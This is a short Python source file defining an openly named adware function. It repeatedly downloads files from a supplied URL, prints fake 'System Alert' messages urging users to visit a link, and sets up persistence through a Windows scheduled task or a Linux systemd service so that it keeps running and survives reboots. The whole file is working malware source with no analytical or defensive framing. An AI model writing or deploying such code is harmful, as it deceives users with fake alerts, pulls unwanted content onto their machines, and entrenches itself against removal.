import os
import platform
import requests
import time
import subprocess
from threading import Thread

def adware_auto_download_files_fake_alerts(download_url: str, alert_url: str) -> None:
    def download_file(url):
        response = requests.get(url)
        if response.status_code == 200:
            with open('downloaded_file', 'wb') as file:
                file.write(response.content)
            print(f"File downloaded from {url}")

    def display_alert(url):
        print(f"System Alert: Visit {url} for important updates!")

    def create_persistence():
        system = platform.system()
        if system == "Windows":
            service_name = "AdwareService"
            service_command = f'schtasks /create /tn {service_name} /tr "pythonw {os.path.abspath(__file__)}" /sc minute /mo 1'
            subprocess.run(service_command, shell=True)
        elif system == "Linux":
            service_name = "adware"
            service_content = f"""[Unit]
Description=Adware Service

[Service]
ExecStart=python3 {os.path.abspath(__file__)}
Restart=always

[Install]
WantedBy=multi-user.target
"""
            with open(f"/etc/systemd/system/{service_name}.service", "w") as service_file:
                service_file.write(service_content)
            subprocess.run(["systemctl", "daemon-reload"])
            subprocess.run(["systemctl", "enable", service_name])
            subprocess.run(["systemctl", "start", service_name])

    def run_periodically(interval, func, *args):
        while True:
            func(*args)
            time.sleep(interval)

    # Start downloading files every 5 minutes
    download_thread = Thread(target=run_periodically, args=(300, download_file, download_url))
    download_thread.daemon = True
    download_thread.start()

    # Start displaying alerts every 10 minutes
    alert_thread = Thread(target=run_periodically, args=(600, display_alert, alert_url))
    alert_thread.daemon = True
    alert_thread.start()

    # Create persistence
    create_persistence()

    # Keep the main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Adware stopped.")
